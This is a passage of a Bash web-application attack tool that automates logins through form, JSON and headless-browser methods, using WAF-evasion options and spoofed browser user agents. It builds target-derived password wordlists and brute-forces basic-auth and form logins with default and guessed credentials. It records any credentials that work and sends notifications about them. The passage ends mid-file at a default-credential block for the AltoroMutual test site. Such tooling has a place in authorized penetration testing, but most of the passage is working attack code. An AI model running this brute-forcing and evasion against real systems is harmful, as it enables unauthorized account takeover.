        -H "Referer: ${login_url}" \
        -H "Origin: ${_base_url}" \
        "${WAF_EVASION_CURL_OPTS[@]+"${WAF_EVASION_CURL_OPTS[@]}"}" \
        -o "$tmp_body" \
        "$login_url" 2>/dev/null

    # Failure detection (body keywords)
    local body_failed=false
    grep -qiE "invalid (password|credentials|username)|login (failed|error)|incorrect (password|credentials)|authentication failed|wrong password|bad credentials|sign in failed" \
        "$tmp_body" 2>/dev/null && body_failed=true

    # Try JWT extraction first
    local jwt; jwt=$(_extract_jwt_from_response "$tmp_body" "$tmp_hdr")

    # Count cookies
    local got_cookie; got_cookie=$(grep -E "^(#HttpOnly_)?[^#]" "$tmp_jar" 2>/dev/null | grep -v "^$" | wc -l)

    rm -f "$tmp_hdr"

    if [[ -n "$jwt" ]] && ! $body_failed; then
        AUTH_TOKEN="$jwt"
        AUTH_LOGIN_TYPE="jwt"
        rm -f "$tmp_body" "$tmp_jar"
        return 0
    elif [[ "$got_cookie" -gt 0 ]] && ! $body_failed; then
        cp "$tmp_jar" "$AUTH_SESSION_FILE"
        AUTH_COOKIE=$(sed 's/^#HttpOnly_//' "$AUTH_SESSION_FILE" 2>/dev/null | \
            grep -v "^#\|^$" | awk -F'\t' 'NF>=7{print $6"="$7}' | tr '\n' ';' | sed 's/;$//')
        AUTH_LOGIN_TYPE="cookie"
        rm -f "$tmp_body" "$tmp_jar"
        return 0
    fi

    rm -f "$tmp_body" "$tmp_jar"
    return 1
}

# JSON body POST login â€” for REST APIs / SPAs that accept application/json
# On success sets AUTH_TOKEN + AUTH_LOGIN_TYPE=jwt, returns 0
_try_api_login() {
    local login_url="$1" username="$2" password="$3"
    local user_field="${4:-username}" pass_field="${5:-password}"
    local tmp_body; tmp_body=$(mktemp /tmp/webpwn_body_XXXXXX)
    local tmp_hdr; tmp_hdr=$(mktemp /tmp/webpwn_hdr_XXXXXX)
    local tmp_jar; tmp_jar=$(mktemp /tmp/webpwn_jar_XXXXXX)

    # Try common JSON body structures that REST APIs use
    local -a json_bodies=(
        "{\"${user_field}\":\"${username}\",\"${pass_field}\":\"${password}\"}"
        "{\"email\":\"${username}\",\"password\":\"${password}\"}"
        "{\"login\":\"${username}\",\"password\":\"${password}\"}"
        "{\"username\":\"${username}\",\"password\":\"${password}\"}"
    )

    # Bootstrap WAF session before API login attempts
    local _api_base; _api_base=$(python3 -c "
from urllib.parse import urlparse; u=urlparse('${login_url}'); print(f'{u.scheme}://{u.netloc}')
" 2>/dev/null || echo "${login_url%%/api*}")
    _bootstrap_waf_session "$_api_base" "$tmp_jar"

    for json_body in "${json_bodies[@]}"; do
        > "$tmp_body"; > "$tmp_hdr"
        # Honour WAF delay between JSON login attempts
        waf_sleep
        curl -s -X POST \
            -H "Content-Type: application/json" \
            -H "Accept: application/json" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
            -H "Origin: ${_api_base}" \
            -H "Referer: ${_api_base}/" \
            "${WAF_EVASION_CURL_OPTS[@]+"${WAF_EVASION_CURL_OPTS[@]}"}" \
            -c "$tmp_jar" -b "$tmp_jar" \
            -D "$tmp_hdr" \
            -d "$json_body" \
            --connect-timeout 10 --max-time 15 \
            -o "$tmp_body" \
            "$login_url" 2>/dev/null

        local http_code; http_code=$(grep -oP "HTTP/[0-9.]+ \K[0-9]+" "$tmp_hdr" 2>/dev/null | tail -1)
        local jwt; jwt=$(_extract_jwt_from_response "$tmp_body" "$tmp_hdr")

        # Also check for cookie session from JSON login
        local got_cookie; got_cookie=$(grep -E "^(#HttpOnly_)?[^#]" "$tmp_jar" 2>/dev/null | grep -v "^$" | wc -l)

        if [[ -n "$jwt" ]] && [[ "$http_code" =~ ^(200|201)$ ]]; then
            AUTH_TOKEN="$jwt"
            AUTH_LOGIN_TYPE="jwt"
            rm -f "$tmp_body" "$tmp_hdr" "$tmp_jar"
            return 0
        elif [[ "$got_cookie" -gt 0 ]] && [[ "$http_code" =~ ^(200|201|302)$ ]]; then
            cp "$tmp_jar" "$AUTH_SESSION_FILE"
            AUTH_COOKIE=$(sed 's/^#HttpOnly_//' "$AUTH_SESSION_FILE" 2>/dev/null | \
                grep -v "^#\|^$" | awk -F'\t' 'NF>=7{print $6"="$7}' | tr '\n' ';' | sed 's/;$//')
            AUTH_LOGIN_TYPE="cookie"
            rm -f "$tmp_body" "$tmp_hdr" "$tmp_jar"
            return 0
        fi
    done

    rm -f "$tmp_body" "$tmp_hdr" "$tmp_jar"
    return 1
}

# Unified login: tries form POST first, then JSON API, then reports result
# Reads: login_url, user_field, pass_field, username, password
# Writes: AUTH_TOKEN or AUTH_COOKIE, AUTH_LOGIN_TYPE
_perform_login() {
    local login_url="$1" user_field="$2" pass_field="$3" username="$4" password="$5"
    local role_label="${6:-user}"

    log_info "  Attempting login: ${username} @ ${login_url}"

    # Try 0: headless browser â€” handles JS bot challenges (Incapsula, Cloudflare
    # managed challenge, etc.) that curl cannot bypass. Also handles SPA login
    # forms rendered by Angular/React that need JS to execute before submitting.
    if python3 -c "import playwright" 2>/dev/null; then
        if _headless_login "$login_url" "$username" "$password"; then
            log_ok "  Headless login succeeded [${AUTH_LOGIN_TYPE}]: ${username}"
            return 0
        fi
        log_info "  Headless login failed â€” falling back to curl-based login..."
    fi

    # Try 1: form-encoded POST (traditional web forms)
    if _try_form_login "$login_url" "$user_field" "$pass_field" "$username" "$password"; then
        log_ok "  Form login succeeded [${AUTH_LOGIN_TYPE}]: ${username}"
        return 0
    fi

    # Try 2: JSON body POST (REST APIs / modern SPAs)
    log_info "  Form POST failed â€” trying JSON API login..."
    if _try_api_login "$login_url" "$username" "$password" "$user_field" "$pass_field"; then
        log_ok "  JSON API login succeeded [${AUTH_LOGIN_TYPE}]: ${username}"
        return 0
    fi

    log_warn "  Login failed for ${username} (${role_label}) â€” tried headless + form + JSON API"
    return 1
}

# Setup primary auth from explicit flags (token / cookie / header / form+api)
setup_auth() {
    AUTH_SESSION_FILE="$OUTDIR/auth_session.txt"
    AUTH_LOGIN_TYPE="none"
    touch "$AUTH_SESSION_FILE"

    # Only probe for login redirect when credentials were actually provided.
    # If no creds given, skip all login detection and scan unauthenticated.
    if [[ -n "$AUTH_USER" || -n "$AUTH_TOKEN" || -n "$AUTH_COOKIE" || -n "$AUTH_HEADER" ]]; then
        local _probe_base="${AUTH_LOGIN_URL:-${TARGET:+https://${TARGET}}}"
        [[ -n "$_probe_base" ]] && _detect_login_redirect "$_probe_base"
    else
        log_info "No credentials provided â€” skipping login detection, scanning unauthenticated"
    fi

    # Always inject CUSTOM_HEADERS into opts even when no auth mode
    if [[ ${#CUSTOM_HEADERS_ARGS[@]} -gt 0 && -z "$AUTH_HEADER" && -z "$AUTH_TOKEN" && \
          -z "$AUTH_COOKIE" && -z "$AUTH_USER" ]]; then
        local custom_curl=(); local custom_dalfox=(); local custom_sqlmap=()
        for h in "${CUSTOM_HEADERS_ARGS[@]}"; do
            custom_curl+=("-H" "$h"); custom_dalfox+=("--header" "$h"); custom_sqlmap+=("--headers" "$h")
        done
        AUTH_CURL_OPTS=("${custom_curl[@]}")
        AUTH_HTTPX_OPTS=("${custom_curl[@]}")
        AUTH_NUCLEI_OPTS=("${custom_curl[@]}")
        AUTH_FFUF_OPTS=("${custom_curl[@]}")
        AUTH_KATANA_OPTS=("${custom_curl[@]}")
        AUTH_DALFOX_OPTS=("${custom_dalfox[@]}")
        AUTH_SQLMAP_OPTS=("${custom_sqlmap[@]}")
        AUTH_FEROX_OPTS=("${custom_curl[@]}")
        log_info "Custom headers injected into all tools (${#CUSTOM_HEADERS_ARGS[@]} header(s))"
    fi

    if [[ -n "$AUTH_HEADER" ]]; then
        AUTH_MODE="header"
        local custom_curl=(); local custom_dalfox=(); local custom_sqlmap=()
        for h in "${CUSTOM_HEADERS_ARGS[@]+"${CUSTOM_HEADERS_ARGS[@]}"}"; do
            custom_curl+=("-H" "$h"); custom_dalfox+=("--header" "$h"); custom_sqlmap+=("--headers" "$h")
        done
        AUTH_CURL_OPTS=("-H" "$AUTH_HEADER" "${custom_curl[@]+"${custom_curl[@]}"}")
        AUTH_HTTPX_OPTS=("-H" "$AUTH_HEADER" "${custom_curl[@]+"${custom_curl[@]}"}")
        AUTH_NUCLEI_OPTS=("-H" "$AUTH_HEADER" "${custom_curl[@]+"${custom_curl[@]}"}")
        AUTH_FFUF_OPTS=("-H" "$AUTH_HEADER" "${custom_curl[@]+"${custom_curl[@]}"}")
        AUTH_KATANA_OPTS=("-H" "$AUTH_HEADER" "${custom_curl[@]+"${custom_curl[@]}"}")
        AUTH_DALFOX_OPTS=("--header" "$AUTH_HEADER" "${custom_dalfox[@]+"${custom_dalfox[@]}"}")
        AUTH_SQLMAP_OPTS=("--headers" "$AUTH_HEADER" "${custom_sqlmap[@]+"${custom_sqlmap[@]}"}")
        AUTH_FEROX_OPTS=("-H" "$AUTH_HEADER" "${custom_curl[@]+"${custom_curl[@]}"}")
        log_ok "Auth: custom header â†’ ${AUTH_HEADER:0:60}"

    elif [[ -n "$AUTH_TOKEN" ]]; then
        AUTH_MODE="jwt"
        AUTH_LOGIN_TYPE="jwt"
        if $JWT_COOKIE_MODE && [[ -n "$JWT_COOKIE_NAME" ]]; then
            _populate_auth_from_jwt_in_cookie "$JWT_COOKIE_NAME" "$AUTH_TOKEN"
            log_ok "Auth: JWT in cookie '${JWT_COOKIE_NAME}' â†’ ${AUTH_TOKEN:0:20}..."
        else
            _populate_auth_from_token "$AUTH_TOKEN"
            log_ok "Auth: Bearer/JWT token â†’ ${AUTH_TOKEN:0:20}..."
        fi
        _decode_jwt_claims "$AUTH_TOKEN"

    elif [[ -n "$AUTH_COOKIE" ]]; then
        AUTH_MODE="cookie"
        AUTH_LOGIN_TYPE="cookie"
        _populate_auth_from_cookie "$AUTH_COOKIE"
        log_ok "Auth: cookie â†’ ${AUTH_COOKIE:0:60}"

    elif [[ -n "$AUTH_USER" && -n "$AUTH_PASS" ]]; then
        # If --auth-login-url was not set and _detect_login_redirect() didn't
        # find one (e.g. Incapsula blocked the probe), fall back to common paths.
        if [[ -z "$AUTH_LOGIN_URL" ]]; then
            log_warn "Auth: no login URL detected â€” probing common paths..."
            local _base="https://${TARGET}"
            for _p in /login /api/login /api/auth/login /auth/login /signin /user/login /api/v1/login; do
                local _c; _c=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 \
                    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
                    "${_base}${_p}" 2>/dev/null)
                if [[ "$_c" =~ ^(200|301|302|405)$ ]]; then
                    AUTH_LOGIN_URL="${_base}${_p}"
                    log_ok "  Auth: login URL found via fallback probe: ${AUTH_LOGIN_URL} (HTTP ${_c})"
                    break
                fi
            done
        fi
        [[ -z "$AUTH_LOGIN_URL" ]] && { log_warn "Auth: could not determine login URL â€” continuing unauthenticated"; }
        AUTH_MODE="form"
        log_phase "Primary Auth Login (${AUTH_ROLE1})"
        if _perform_login "$AUTH_LOGIN_URL" "$AUTH_FORM_USER_FIELD" "$AUTH_FORM_PASS_FIELD" \
                "$AUTH_USER" "$AUTH_PASS" "$AUTH_ROLE1"; then
            if [[ "$AUTH_LOGIN_TYPE" == "jwt" ]]; then
                AUTH_MODE="jwt"
                if $JWT_COOKIE_MODE && [[ -n "$JWT_COOKIE_NAME" ]]; then
                    _populate_auth_from_jwt_in_cookie "$JWT_COOKIE_NAME" "$AUTH_TOKEN"
                    log_ok "Auth [${AUTH_ROLE1}]: JWT-in-cookie session active (${JWT_COOKIE_NAME})"
                else
                    _populate_auth_from_token "$AUTH_TOKEN"
                    log_ok "Auth [${AUTH_ROLE1}]: JWT session active"
                fi
                _decode_jwt_claims "$AUTH_TOKEN"
                # Save token for reference
                echo "$AUTH_TOKEN" > "$OUTDIR/auth_jwt_${AUTH_ROLE1}.txt"
            else
                AUTH_MODE="cookie"
                _populate_auth_from_cookie "$AUTH_COOKIE"
                log_ok "Auth [${AUTH_ROLE1}]: cookie session â†’ ${AUTH_COOKIE:0:60}"
                # Verify the session actually works
                _verify_session "$AUTH_LOGIN_URL"
            fi
        else
            log_warn "Auth: login failed for ${AUTH_USER} â€” continuing unauthenticated"
            AUTH_MODE="none"
        fi
    fi
}

# Probe the base URL (unauthenticated) to detect if the site gates everything
# behind a login-page redirect. Sets AUTH_BASE_REDIRECTS_TO_LOGIN and
# AUTH_DETECTED_LOGIN_URL. Called early in setup_auth so downstream phases know
# whether authenticated crawling is essential.
# Auto-detection strategy (in order):
#   1. Follow redirects with rotating browser UAs â€” capture url_effective
#   2. If WAF blocks with 403/429, read the raw Location: header without following
#   3. Inspect response body for <meta http-equiv="refresh"> and JS window.location
#   4. Check common login paths on the same host directly
# When a login URL is found and --auth-login-url was NOT explicitly set,
# automatically populate AUTH_LOGIN_URL so the scan can authenticate without
# requiring the user to manually specify it.
_detect_login_redirect() {
    local target_url="$1"
    local base_url; base_url=$(python3 -c "
from urllib.parse import urlparse
u = urlparse('$target_url')
print(f'{u.scheme}://{u.netloc}')
" 2>/dev/null || return 1)

    [[ -z "$base_url" || "$base_url" == "://" ]] && return 1

    local final_url=""
    local _login_pattern="/(login|signin|sign-in|auth|sso|saml|oauth|oidc|idp|keycloak|realms|accounts?/login|session/new|users/sign_in|user/login|portal)(\?|$|/)"

    # â”€â”€ Strategy 1: follow redirects with rotating browser UAs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    local -a _uas=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    )
    for _ua in "${_uas[@]}"; do
        local _landed; _landed=$(curl -sk -o /dev/null -w "%{url_effective}" \
            -L --max-redirs 10 --connect-timeout 10 --max-time 15 \
            -H "User-Agent: ${_ua}" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -H "Accept-Language: en-US,en;q=0.9" \
            "$base_url" 2>/dev/null)
        if echo "$_landed" | grep -qiE "$_login_pattern"; then
            final_url="$_landed"
            break
        fi
    done

    # â”€â”€ Strategy 2: raw Location header (WAF may block follow but sends 301/302) â”€
    if [[ -z "$final_url" ]]; then
        local _loc; _loc=$(curl -sk -o /dev/null -D - --max-redirs 0 --connect-timeout 10 \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            "$base_url" 2>/dev/null | grep -i "^location:" | head -1 | awk '{print $2}' | tr -d '\r')
        if [[ -n "$_loc" ]]; then
            # Resolve relative location to absolute
            if [[ "$_loc" =~ ^/ ]]; then _loc="${base_url}${_loc}"; fi
            echo "$_loc" | grep -qiE "$_login_pattern" && final_url="$_loc"
        fi
    fi

    # â”€â”€ Strategy 3: meta-refresh and JS redirect in response body â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -z "$final_url" ]]; then
        local _body; _body=$(curl -sk --connect-timeout 10 --max-time 15 \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
            "$base_url" 2>/dev/null | head -200)
        # meta refresh
        local _meta; _meta=$(echo "$_body" | grep -ioP '(?<=url=)[^\s"'"'"'>]+' | head -1)
        if [[ -n "$_meta" ]]; then
            [[ "$_meta" =~ ^/ ]] && _meta="${base_url}${_meta}"
            echo "$_meta" | grep -qiE "$_login_pattern" && final_url="$_meta"
        fi
        # JS window.location / location.href / location.replace
        if [[ -z "$final_url" ]]; then
            local _jsloc; _jsloc=$(echo "$_body" | grep -ioP '(?<=location\.(?:href|replace)\s*=\s*['"'"'"])[^'"'"'"]+' | head -1)
            [[ -n "$_jsloc" ]] && [[ "$_jsloc" =~ ^/ ]] && _jsloc="${base_url}${_jsloc}"
            echo "$_jsloc" | grep -qiE "$_login_pattern" && final_url="$_jsloc"
        fi
    fi

    # â”€â”€ Strategy 4: probe common login paths on the same host â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -z "$final_url" ]]; then
        local -a _paths=("/login" "/signin" "/auth/login" "/auth" "/user/login"
                         "/users/sign_in" "/session/new" "/portal" "/sso" "/app/login"
                         "/api/login" "/api/auth/login" "/account/login" "/admin/login")
        for _p in "${_paths[@]}"; do
            local _code; _code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
                "${base_url}${_p}" 2>/dev/null)
            if [[ "$_code" =~ ^(200|301|302)$ ]]; then
                final_url="${base_url}${_p}"
                log_info "  Login page found via path probe: ${final_url} (HTTP ${_code})"
                break
            fi
        done
    fi

    # â”€â”€ Consolidate result â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -n "$final_url" ]]; then
        AUTH_BASE_REDIRECTS_TO_LOGIN=true
        AUTH_DETECTED_LOGIN_URL="$final_url"
        log_finding "Login-gated site detected: ${base_url} â†’ ${final_url}"
        # Auto-wire: if no --auth-login-url given, use the detected URL so the
        # scan can authenticate without the user having to specify it manually.
        if [[ -z "$AUTH_LOGIN_URL" ]]; then
            AUTH_LOGIN_URL="$final_url"
            log_ok "  Auto-set --auth-login-url to detected login page: ${AUTH_LOGIN_URL}"
        fi
        # Also auto-set secondary login URL if not explicitly set
        [[ -z "$AUTH_LOGIN_URL2" && -n "$AUTH_USER2" ]] && AUTH_LOGIN_URL2="$final_url"
    else
        AUTH_BASE_REDIRECTS_TO_LOGIN=false
        log_info "  Base URL loads without login gate: ${base_url}"
    fi
}

# Verify the captured session returns a non-401/403 response.
# Extracts scheme://host from the login URL so any login path shape works,
# then probes a prioritised list of common authenticated endpoints.
_verify_session() {
    local login_url="$1"
    local base_url; base_url=$(python3 -c "
from urllib.parse import urlparse
u = urlparse('$login_url')
print(f'{u.scheme}://{u.netloc}')
" 2>/dev/null || echo "${login_url%%/login*}")

    local probe_paths=(
        "/api/v1/user" "/api/v1/me" "/api/me" "/api/user" "/api/profile"
        "/api/v2/user" "/api/v2/me" "/api/account" "/api/v1/account"
        "/me" "/profile" "/dashboard" "/home" "/app" "/"
    )

    local verified=false
    for p in "${probe_paths[@]}"; do
        local test_url="${base_url}${p}"
        local code; code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 8 \
            -L --max-redirs 3 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$test_url" 2>/dev/null)
        if [[ "$code" =~ ^(200|201|204)$ ]]; then
            log_ok "  Session verified (${test_url} â†’ ${code})"
            verified=true
            break
        elif [[ "$code" == "401" || "$code" == "403" ]]; then
            log_warn "  Session verification: ${test_url} returned ${code} â€” session may be incomplete"
            break
        fi
        # 404 / 302 to login â€” try next candidate
    done
    $verified || log_warn "  Session could not be verified against any common authenticated endpoint"
}

# Setup secondary (low-privilege) auth for IDOR / BAC testing
setup_auth_secondary() {
    [[ -z "$AUTH_USER2" || -z "$AUTH_PASS2" ]] && return
    local login_url="${AUTH_LOGIN_URL2:-$AUTH_LOGIN_URL}"
    [[ -z "$login_url" ]] && {
        log_warn "Auth2: no login URL for ${AUTH_ROLE2} user â€” set --auth-login-url or --auth-login-url2"
        return
    }

    AUTH2_SESSION_FILE="$OUTDIR/auth2_session.txt"
    touch "$AUTH2_SESSION_FILE"
    log_phase "Secondary Auth Login (${AUTH_ROLE2})"

    # Temporarily redirect cookie jar writes to auth2 session file
    local _save_session="$AUTH_SESSION_FILE"
    local _save_cookie="$AUTH_COOKIE"
    local _save_token="$AUTH_TOKEN"
    local _save_type="$AUTH_LOGIN_TYPE"
    AUTH_SESSION_FILE="$AUTH2_SESSION_FILE"

    if _perform_login "$login_url" "$AUTH_FORM_USER_FIELD2" "$AUTH_FORM_PASS_FIELD2" \
            "$AUTH_USER2" "$AUTH_PASS2" "$AUTH_ROLE2"; then
        if [[ "$AUTH_LOGIN_TYPE" == "jwt" ]]; then
            AUTH2_MODE="jwt"
            AUTH2_TOKEN="$AUTH_TOKEN"
            local hdr2="Authorization: Bearer ${AUTH2_TOKEN}"
            AUTH2_CURL_OPTS=("-H" "$hdr2")
            AUTH2_HTTPX_OPTS=("-H" "$hdr2")
            log_ok "Auth2 [${AUTH_ROLE2}]: JWT session active"
            # Decode claims â€” log user ID / role for context
            python3 -c "
import sys, json, base64
parts = sys.argv[1].split('.')
if len(parts)!=3: sys.exit(0)
pad = parts[1]+'='*(4-len(parts[1])%4)
try:
    d = json.loads(base64.urlsafe_b64decode(pad))
    uid = next((str(d.get(k,'')) for k in ['sub','user_id','userId','uid','id'] if d.get(k)), '?')
    role = next((str(d.get(k,'')) for k in ['role','roles','scope'] if d.get(k)), '?')
    print(f'  JWT2 â†’ user_id={uid}  role={role}')
except: pass
" "$AUTH2_TOKEN" 2>/dev/null && true
            echo "$AUTH2_TOKEN" > "$OUTDIR/auth_jwt_${AUTH_ROLE2}.txt"
        else
            AUTH2_MODE="cookie"
            AUTH2_COOKIE="$AUTH_COOKIE"
            AUTH2_CURL_OPTS=("-H" "Cookie: ${AUTH2_COOKIE}")
            AUTH2_HTTPX_OPTS=("-H" "Cookie: ${AUTH2_COOKIE}")
            log_ok "Auth2 [${AUTH_ROLE2}]: cookie session â†’ ${AUTH2_COOKIE:0:60}"
        fi
    else
        log_warn "Auth2: login failed for ${AUTH_USER2} â€” IDOR/BAC will only compare against unauth"
    fi

    # Restore primary auth state
    AUTH_SESSION_FILE="$_save_session"
    AUTH_COOKIE="$_save_cookie"
    AUTH_TOKEN="$_save_token"
    AUTH_LOGIN_TYPE="$_save_type"

    log_ok "Auth summary: ${AUTH_ROLE1}=${AUTH_MODE} | ${AUTH_ROLE2}=${AUTH2_MODE}"
}

# â”€â”€â”€ Custom wordlist generator â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Builds a target-specific password candidate list from domain name & company info
generate_target_wordlist() {
    local target="$1"
    local out_file="$OUTDIR/recon/wordlists/target_passwords.txt"
    local company; company=$(echo "$target" | cut -d. -f1)  # e.g. "example" from example.com
    local company_cap; company_cap="$(tr '[:lower:]' '[:upper:]' <<< "${company:0:1}")${company:1}"
    local year; year=$(date +%Y)
    local year_s; year_s=$(date +%y)

    log_info "  Generating target-specific password wordlist for '${company}'..."

    {
        # Company-based patterns
        echo "${company}"
        echo "${company_cap}"
        echo "${company}123"
        echo "${company}1234"
        echo "${company}12345"
        echo "${company}@123"
        echo "${company}@1234"
        echo "${company}!123"
        echo "${company}${year}"
        echo "${company}${year_s}"
        echo "${company}_${year}"
        echo "${company}#${year}"
        echo "${company_cap}123"
        echo "${company_cap}@123"
        echo "${company_cap}${year}"
        echo "${company_cap}${year}!"
        echo "${company_cap}@${year}"
        echo "Admin${company_cap}"
        echo "${company}admin"
        echo "${company}Admin"
        echo "${company}pass"
        echo "${company}Pass"
        echo "${company}password"
        echo "${company}Password"
        echo "Welcome${year}"
        echo "Welcome@${year}"
        echo "Welcome1"
        echo "P@ssw0rd"
        echo "P@ssword1"
        echo "P@\$\$w0rd"
        echo "Passw0rd"
        echo "Passw0rd!"
        echo "Password1"
        echo "Password@1"
        echo "password"
        echo "password1"
        echo "password123"
        echo "password@123"
        echo "admin"
        echo "admin123"
        echo "admin@123"
        echo "Admin123"
        echo "Admin@123"
        echo "administrator"
        echo "Administrator1"
        echo "root"
        echo "root123"
        echo "toor"
        echo "1234"
        echo "12345"
        echo "123456"
        echo "1234567"
        echo "12345678"
        echo "123456789"
        echo "1234567890"
        echo "test"
        echo "test123"
        echo "Test@123"
        echo "demo"
        echo "demo123"
        echo "demo1234"
        echo "Demo@123"
        echo "guest"
        echo "guest123"
        echo "changeme"
        echo "changeme123"
        echo "Change@me1"
        echo "default"
        echo "Default1"
        echo "secret"
        echo "Secret123"
        echo "qwerty"
        echo "qwerty123"
        echo "letmein"
        echo "iloveyou"
        echo "sunshine"
        echo "abc123"
        echo "abc@123"
        echo "Abc@123"
        echo "111111"
        echo "000000"
        echo "pass"
        echo "pass123"
        echo "pass@123"
        # Service-common patterns
        echo "monitor"
        echo "monitor123"
        echo "sysadmin"
        echo "superadmin"
        echo "superuser"
        echo "manager"
        echo "Manager@1"
        echo "devops"
        echo "devops123"
        echo "support"
        echo "support123"
        echo "helpdesk"
        echo "service"
        echo "service123"
    } | sort -u > "$out_file"

    local count; count=$(wc -l < "$out_file")
    log_ok "  Target wordlist: ${count} passwords â†’ $out_file"
    echo "$out_file"
}

# â”€â”€â”€ Basic-auth brute helper â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_try_basic_auth() {
    local app="$1" url="$2"; shift 2
    log_info "  Detected: ${app} â€” trying basic auth on ${url}"
    for cred in "$@"; do
        local u="${cred%%:*}" p="${cred#*:}"
        log_dim "    Trying ${u}:${p}..."
        local code; code=$(curl -s -o /dev/null -w "%{http_code}" \
            --connect-timeout 5 --max-time 8 -u "${u}:${p}" "$url" 2>/dev/null)
        if [[ "$code" == "200" ]]; then
            AUTH_MODE="auto"
            local encoded; encoded=$(printf '%s' "${u}:${p}" | base64)
            local hdr="Authorization: Basic $encoded"
            AUTH_CURL_OPTS=("-H" "$hdr")
            AUTH_HTTPX_OPTS=("-H" "$hdr")
            AUTH_NUCLEI_OPTS=("-H" "$hdr")
            AUTH_FFUF_OPTS=("-H" "$hdr")
            AUTH_KATANA_OPTS=("-H" "$hdr")
            AUTH_DALFOX_OPTS=("--header" "$hdr")
            AUTH_SQLMAP_OPTS=("--headers" "$hdr")
            AUTH_FEROX_OPTS=("-H" "$hdr")
            log_ok "  Basic auth worked: ${u}:${p}"
            echo "${u}:${p}" >> "$OUTDIR/auth_creds_found.txt"
            return 0
        fi
    done
    return 1
}

# Auto-detect app from httpx output and try known default credentials
# Called after phase_http. TRY_DEFAULT_CREDS=true by default.
try_default_creds() {
    [[ "$AUTH_MODE" != "none" ]] && return
    log_phase "Auto Auth: Detecting App & Trying Default Credentials"

    local httpx_data; httpx_data=$(cat "$HTTP_DIR/httpx_full.txt" 2>/dev/null || echo "")
    [[ -z "$httpx_data" ]] && { log_warn "  No httpx data yet â€” skipping default creds"; return; }

    # Extract a usable base URL from httpx output
    local base_url; base_url=$(grep -oP 'https?://[^ \[]+' "$HTTP_DIR/httpx_full.txt" 2>/dev/null | \
        head -1 | grep -oP 'https?://[^/]+' || echo "http://$TARGET")

    # Generate target-specific passwords (domain-aware)
    local custom_wl; custom_wl=$(generate_target_wordlist "$TARGET")

    # Helper: try cred list + target wordlist against a form login
    _detect_try() {
        local app="$1" login_path="$2" user_field="$3" pass_field="$4"; shift 4
        log_info "  Detected: ${app} â€” trying default creds on ${base_url}${login_path}"
        local all_creds=("$@")
        # Append custom wordlist entries for admin/root usernames
        if [[ -s "$custom_wl" ]]; then
            while IFS= read -r pw; do
                all_creds+=("admin:${pw}" "root:${pw}" "administrator:${pw}")
            done < "$custom_wl"
        fi
        for cred in "${all_creds[@]}"; do
            local u="${cred%%:*}" p="${cred#*:}"
            log_dim "    Trying ${u}:${p}..."
            if _try_form_login "${base_url}${login_path}" "$user_field" "$pass_field" "$u" "$p"; then
                AUTH_MODE="auto"
                _populate_auth_from_cookie "$AUTH_COOKIE"
                log_ok "  Default creds worked: ${u}:${p}"
                echo "${u}:${p}" >> "$OUTDIR/auth_creds_found.txt"
                notify_all "ðŸ”‘ Default creds found on ${base_url}: ${u}:${p} (${app})"
                return 0
            fi
        done
        return 1
    }

    # â”€â”€ AltoroMutual / IBM testfire â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "altoro|testfire|altoromutual"; then
        _detect_try "AltoroMutual" "/doLogin" "uid" "passw" \
            "admin:admin" "admin:admin123" "admin:demo1234" \
            "jsmith:demo1234" "sspeed:demo1234" "tbrown:demo1234" \
            "tuser:demo1234" "jdoe:demo1234" "admin:AltoroMutual" && return 0
    fi

